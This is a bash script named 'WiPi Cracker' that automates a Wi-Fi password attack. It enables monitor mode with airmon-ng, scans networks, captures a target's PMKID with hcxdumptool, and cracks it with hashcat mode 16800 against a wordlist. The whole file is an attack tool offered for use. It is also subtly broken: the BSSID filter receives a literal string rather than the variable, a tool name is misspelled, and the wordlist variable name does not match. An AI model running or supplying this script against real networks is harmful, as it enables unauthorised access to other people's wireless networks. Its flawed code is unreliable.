#!/bin/bash

#Clear screen
clear


#Art
figlet WiPi Cracker
echo ""


#Check if root
usr=$(whoami)
if [[ $usr != root ]]; then
        echo "Run as root"
        echo "Command: sudo ./run.sh"
        exit 1
fi


#Wireless network choice
ip a
echo "input the wireless network interface from the list above (eg. wlan0, wlan1, wlan2, wlan3, etc.):"
read wireless_interface

sudo airmon-ng start $wireless_interface
sudo airodump-ng ${wireless_interface}mon
echo "Enter the BSSID of the netowrk: "
read BSSID

echo "Enter a file name for the output to go to (to ending like .txt .pdf etc): "
read OutputFile

sudo hcxdumptool -i ${wireless_interface}mon -o $OutputFile --enable_status=1 --filterlist_ap=BSSID --filtermode=2

sudo hcxcaptool -z hash.txt $OutputFile

echo "Possible passwords location: "
read passowrds

sudo hashcat -m 16800 hash.txt $passwords

exit 0
